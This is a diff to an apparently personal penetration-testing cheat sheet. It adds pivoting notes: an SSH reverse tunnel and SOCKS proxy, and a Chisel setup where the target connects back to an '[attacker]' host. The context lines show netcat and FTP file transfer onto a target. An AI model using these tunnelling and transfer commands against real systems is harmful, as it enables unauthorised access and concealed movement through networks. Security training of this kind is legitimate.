@@ -16,6 +16,12 @@
   - run this: `nc -l 1234 > file.sh`
  
 #### SSH
+- using proxychains:
+   - from target:
+      - `ssh -fN -R [port] root@[localhost]`
+   - from local host:
+      - `ssh -fN -D [port] user@[target]`
+
 - for a better shell, can try ssh
 - .ssh files in /home/user -> identify with `ls -la`
 - create keypair
@@ -42,6 +48,16 @@
    - `echo GET wget.exe>> ftpreq.txt`
    - `echo bye>> ftpreq.txt`
   - Run `ftp -v -n -s:ftpreq.txt`
+
+#### Chisel
+- host:
+   - `chisel server -p 8000 --socks5 --reverse`
+- target:
+   - `chisel client [attacker]:8000 R:socks`
+- edit /etc/proxychains.conf
+...
+- socks5    [host] 1080
+- proxychains [command to execute on target]
 
 ## Original foothold:
 - Manual shell msfvenom
